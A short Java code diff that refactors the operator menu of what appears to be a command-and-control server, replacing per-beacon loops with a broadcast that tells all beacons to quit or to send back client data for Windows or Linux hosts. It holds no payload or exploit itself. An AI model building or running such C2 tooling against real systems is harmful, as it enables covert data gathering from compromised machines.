@@ -267,9 +267,7 @@ public class C2ServerUserHandler implements Runnable{
                     System.out.println(RED + "Closing Server..."+ RESET);
                     System.out.println();
                     C2server.stopServer();
-                    for (C2ServerBeaconHandler beaconHandler : C2server.longRangeBeacons.values()){
-                        beaconHandler.sendToBeacon("quit");
-                    }
+                    C2server.broadcastToBeacons("quit");
                     break;
                 } else {
                     System.out.println("Invalid Input");
@@ -323,18 +321,14 @@ public class C2ServerUserHandler implements Runnable{
                 if(userInput.equals("1")){
                     String OS = "Windows";
                     // TO DO figure out how to send request to beacon server
-                    for (C2ServerBeaconHandler beaconHandler : C2server.longRangeBeacons.values()){
-                        beaconHandler.sendToBeacon("Request ClientData "+ OS +" All");
-                    }
+                    C2server.broadcastToBeacons("Request ClientData "+ OS +" All");
                     try {
                         waitForResponse();
                     } catch (InterruptedException e) {e.printStackTrace();}
                 } else if (userInput.equals("2")){
                     String OS = "Linux";
                     // TO DO figure out how to send request to beacon server
-                    for (C2ServerBeaconHandler beaconHandler : C2server.longRangeBeacons.values()){
-                        beaconHandler.sendToBeacon("Request ClientData "+ OS +" All");
-                    }
+                    C2server.broadcastToBeacons("Request ClientData "+ OS +" All");
                     try {
                         waitForResponse();
                     } catch (InterruptedException e) {e.printStackTrace();}
